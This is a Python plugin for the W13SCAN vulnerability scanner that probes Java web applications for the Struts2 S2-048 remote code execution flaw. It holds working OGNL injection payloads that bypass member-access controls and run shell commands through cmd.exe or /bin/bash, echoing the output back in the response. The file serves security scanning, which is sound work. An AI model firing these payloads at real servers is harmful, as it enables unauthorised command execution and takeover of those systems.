#coding   :utf-8
#file     : struts2_048.py
#author   : go0p
#time     : 2019/8/18 1:54 PM
#software :PyCharm

import copy
import os
import random
import requests

from W13SCAN.lib.common import prepare_url
from W13SCAN.lib.const import acceptedExt, ignoreParams, Level
from W13SCAN.lib.output import out
from W13SCAN.lib.plugins import PluginBase

class W13SCAN(PluginBase):
    name = 'Struts2-048远程代码执行'
    desc = ''''''
    level = Level.HIGHT

    def audit(self):
        method = self.requests.command  # 请求方式 GET or POST
        headers = self.requests.get_headers()  # 请求头 dict类型
        url = self.build_url()  # 请求完整URL
        resp_data = self.response.get_body_data()  # 返回数据 byte类型
        resp_str = self.response.get_body_str()  # 返回数据 str类型 自动解码
        resp_headers = self.response.get_headers()  # 返回头 dict类型

        p = self.requests.urlparse
        params = self.requests.params
        netloc = self.requests.netloc

        if self.response.language and self.response.language != "JAVA":
            return
        if method == 'GET':
            exi = os.path.splitext(p.path)[1]
            if exi not in acceptedExt:
                return

            ran_a = random.randint(10000000, 20000000)
            ran_b = random.randint(1000000, 2000000)
            ran_check = ran_a - ran_b
            ran_number = '${%d-%d}' % (ran_a, ran_b)
            lin = 'expr' + ' ' + str(ran_a) + ' - ' + str(ran_b)

            checks = [str(ran_check), '无法初始化设备 PRN', '??????? PRN', 'Unable to initialize device PRN']
            payloads = [
                ran_number,
                r"${(#dm=@\u006Fgnl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess=#dm).(#ef='print test').(#iswin=(@\u006Aava.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#efe=(#iswin?{'cmd.exe','/c',#ef}:{'/bin/bash','-c',#ef})).(#p=new \u006Aava.lang.ProcessBuilder(#efe)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",

            ]
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
            for payload in payloads:
                data_048 = {
                    "name": payload,
                    "age": 111,
                    "bustedBefore": "true",
                    "__checkbox_bustedBefore": "true",
                    "description": 111,
                }
                r1 = requests.post(url, headers=headers, data=data_048)
                html1 = r1.text
                for check in checks:
                    if check in html1:
                        out.success(url, self.name, playload="{}".format(payload), method=method, check=check,
                                    raw=r1.raw)
                        data_048.clear()
                        return
                data_048 = {
                    "name": r"%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=#parameters.cmd[0]).(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",
                    "cmd": lin,
                    "age": 111,
                    "bustedBefore": "true",
                    "__checkbox_bustedBefore": "true",
                    "description": 111,
                }
                r2 = requests.post(url, headers=headers, data=data_048)
                for check in checks:
                    if check in r2.text:
                        out.success(url, self.name, playload="{}".format(lin), method=method, check=check,
                                    raw=r2.raw)
                        data_048.clear()
                        return